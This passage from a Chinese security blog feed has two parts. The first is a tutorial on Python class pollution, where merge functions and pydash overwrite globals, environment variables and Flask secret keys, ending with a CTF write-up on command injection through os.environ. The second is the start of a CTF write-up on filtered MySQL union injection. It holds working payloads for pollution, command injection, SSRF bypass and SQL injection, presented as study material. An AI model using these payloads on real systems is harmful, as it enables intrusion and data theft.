class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;father&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># father</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><h2 id="无法污染的object属性"><a href="#无法污染的object属性" class="headerlink" title="无法污染的object属性"></a>无法污染的object属性</h2><p>尝试污染Object属性时, 将会提示错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;pollution!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># TypeError: cannot set &#x27;__str__&#x27; attribute of immutable type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="全局变量获取"><a href="#全局变量获取" class="headerlink" title="全局变量获取"></a>全局变量获取</h2><blockquote><p>在<code>Python</code>中，函数或类方法（对于类的内置方法如<code>__init__</code>这些来说，内置方法在并未重写时其数据类型为装饰器即<code>wrapper_descriptor</code>，只有在重写后才是函数<code>function</code>）均具有一个<code>__globals__</code>属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的<code>globals</code>函数的返回值</p></blockquote><p><strong>_<em>globals</em>_</strong></p><blockquote><p><code>__globals__</code> 是 Python 函数对象（function object）的一个属性，用于获取函数定义时所在的全局命名空间（global namespace）。该属性返回一个字典，表示函数在定义时的全局命名空间中的符号表（symbol table）。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    target_secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line">instence = test()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">            <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;target_secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"></span><br><span class="line">merge(payload, instence)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>此时没有继承关系的类属性也被污染了</p><h2 id="已加载模块获取"><a href="#已加载模块获取" class="headerlink" title="已加载模块获取"></a>已加载模块获取</h2><p>test_1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;hahaha&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello, world!&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">tmp = a()</span><br><span class="line">merge(payload, a)</span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line"><span class="comment">#  输出</span></span><br><span class="line"><span class="comment"># hahaha</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>此时已经加载的模块也会被污染</p><h2 id="模块加载关系复杂"><a href="#模块加载关系复杂" class="headerlink" title="模块加载关系复杂"></a>模块加载关系复杂</h2><blockquote><p><code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p></blockquote><p>在<code>import sys</code>的程序中我们可以使用以下payload在复杂的模块导入关系中找到目标模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数形参默认值污染"><a href="#函数形参默认值污染" class="headerlink" title="函数形参默认值污染"></a>函数形参默认值污染</h2><p>主要用到<code>__defaults__和__kwdefaults__</code>两个内置属性</p><h3 id="defaults"><a href="#defaults" class="headerlink" title="__defaults__"></a><code>__defaults__</code></h3><blockquote><p><code>__defaults__</code>以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值即声明在 &#x2F; 后 * 前的参数默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参+键值形参</p></blockquote><h3 id="kwdefaults"><a href="#kwdefaults" class="headerlink" title="__kwdefaults__"></a><code>__kwdefaults__</code></h3><blockquote><p><code>__kwdefaults__</code>以字典的形式按从左到右的顺序收录了函数键值形参的默认值, 即声明在* 后的参数默认值的键值对，从代码上来看，则是如下的效果：</p></blockquote><p>示例payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;func&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span>: (</span><br><span class="line">                    <span class="literal">True</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过os-environ修改环境变量"><a href="#通过os-environ修改环境变量" class="headerlink" title="通过os.environ修改环境变量"></a>通过os.environ修改环境变量</h2><p>通过污染os.environ来修改环境变量LD_PROLOAD与上传.so劫持等扩展攻击面</p><p>这里看见了一个例子 通过os.environ导致命令注入:</p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.__class__.__init__.__globals__[<span class="string">&#x27;subprocess&#x27;</span>].os.environ.__setitem__(<span class="string">&#x27;COMSPEC&#x27;</span>, <span class="string">&quot;cmd /c calc&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="合并函数的真实例子—Pydash"><a href="#合并函数的真实例子—Pydash" class="headerlink" title="合并函数的真实例子—Pydash"></a>合并函数的真实例子—Pydash</h2><blockquote><p>Pydash的set_()和set_with()函数是递归合并函数的示例，我们可以利用它们来污染属性。</p><p>Pydash 函数使用点符号访问属性和项目而不是 JSON 格式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotAccessibleClass</span>: <span class="keyword">pass</span></span><br><span class="line">not_accessible_variable = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.not_accessible_variable&#x27;</span>,<span class="string">&#x27;Polluted variable&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(not_accessible_variable)</span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.NotAccessibleClass.__qualname__&#x27;</span>,<span class="string">&#x27;PollutedClass&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(NotAccessibleClass)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&gt; Polluted variable</span></span><br><span class="line"><span class="comment">#&gt; &lt;class &#x27;__main__.PollutedClass&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="flask相关"><a href="#flask相关" class="headerlink" title="flask相关"></a>flask相关</h2><h3 id="secret-key污染"><a href="#secret-key污染" class="headerlink" title="secret_key污染"></a>secret_key污染</h3><p>之前在客户端session的问题中接触过对flask session的伪造, secret_key就是一个必要的条件</p><p>可以通过覆盖原有的secret_key实现任意session伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;Polluted&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="TSCTF-J2023-Python-Not-Node"><a href="#TSCTF-J2023-Python-Not-Node" class="headerlink" title="TSCTF-J2023 Python Not Node"></a>TSCTF-J2023 Python Not Node</h3><p>找不到哪个靶场有这题, 简单看一下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">os.environ[<span class="string">&#x27;cmd&#x27;</span>] = <span class="string">&quot;ping -c 10 www.baidu.com&quot;</span> </span><br><span class="line">black_list = [<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Userinfo</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): </span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/define&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">define</span>():</span><br><span class="line">   <span class="keyword">if</span> request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(request.args)</span><br><span class="line">           usname = request.args[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">           info = request.args[<span class="string">&#x27;info&#x27;</span>]</span><br><span class="line">           origin_user = request.args[<span class="string">&#x27;origin_user&#x27;</span>]</span><br><span class="line">           user = &#123;usname: info&#125;</span><br><span class="line">           <span class="built_in">print</span>(<span class="built_in">type</span>(user))</span><br><span class="line">           pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;) </span><br><span class="line">           result = comexec().test_ping()</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;USER READY,JUST INSERT YOUR SEARCH RESULT&quot;</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;NOPE&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">       urls = request.args[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">           <span class="keyword">if</span> i <span class="keyword">in</span> urls:</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;HACKER URL!&quot;</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           info = urllib.request.urlopen(urls).read().decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">           <span class="keyword">return</span> info</span><br><span class="line">       <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">           <span class="built_in">print</span>(e)</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;error&quot;</span> </span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Method error&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt; Welcome to this Challenge &lt;/html&gt; &lt;script&gt;alert(&#x27;focus on the </span></span><br><span class="line"><span class="string">source code&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   app.run(debug=<span class="literal">True</span>, port=<span class="number">37333</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一个flask实现的程序</p><p>其中:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;)</span><br><span class="line">result = comexec().test_ping()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br></pre></td></tr></table></figure><p>这里使用了pydash并且之后执行了环境变量中cmd存储的ping命令</p><p>因此就可以通过pydash来污染环境变量 到达命令注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">origin_user=__class__.__init__.__globals__.os.environ&amp;info=Polluted</span><br></pre></td></tr></table></figure><p>至于这里的ssrf, 搬运一下大佬的话</p><blockquote><ul><li><p><strong>SSRF</strong></p><ul><li><p>常见的方式是8进制、16进制、302跳转等绕过，这些都被屏蔽了，最后题解说是简单的大小写绕过。</p><p>但是做题的时候没想到，所以使用的是<strong>localtest.me</strong>域名绕过，这是大佬买下的域名，访问时其实是重定向到本机，这样的域名还有很多。</p></li><li><p>还有一个点就是需要url编码避免参数的混淆解析，因为这里SSRF的域名也需要添加参数，所以我们要进行url编码。</p></li></ul></li></ul></blockquote><p>参考:</p><p><a href="https://xz.aliyun.com/t/13072">https://xz.aliyun.com/t/13072</a></p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python-原链污染-类污染&quot;&gt;&lt;a href=&quot;#Python-原链污染-类污染&quot; class=&quot;headerlink&quot; title=&quot;Python 原链污染(类污染)&quot;&gt;&lt;/a&gt;Python 原链污染(类污染)&lt;/h1&gt;&lt;p&gt;与JavaScript原型链污染</summary>
      
    
    
    
    
    <category term="Python原链污染(类污染)" scheme="http://example.com/tags/Python%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019-Web1</title>
    <link href="http://example.com/2024/02/26/SWPU2019-Web1/"/>
    <id>http://example.com/2024/02/26/SWPU2019-Web1/</id>
    <published>2024-02-26T13:38:46.000Z</published>
    <updated>2024-02-26T15:47:54.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019-Web1"></a>SWPU2019-Web1</h1><p>在注册登录后广告申请处 广告名字段存在注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214413930.png" alt="image-20240226214413930"></p><p>禁了or, 可以使用group by测试出查询字段数</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,version(),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214507781.png" alt="image-20240226214507781"></p><p>这里的难点在于禁了information_schema</p><p>关于无表名,列名注入:</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p><p>这里使用<strong>innodb_table_stats</strong>这张表来发现表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,group_concat(table_name),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1&#x27;=&#x27;1&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226220242765.png" alt="image-20240226220242765"></p><p>之后是无列名注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)from(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226225432773.png" alt="image-20240226225432773"></p><p><strong>总结</strong></p><h2 id="mysql绕过information-schema-无表名列名注入"><a href="#mysql绕过information-schema-无表名列名注入" class="headerlink" title="mysql绕过information_schema, 无表名列名注入"></a>mysql绕过information_schema, 无表名列名注入</h2><h3 id="无表名"><a href="#无表名" class="headerlink" title="无表名:"></a>无表名:</h3><h4 id="InnoDB引擎"><a href="#InnoDB引擎" class="headerlink" 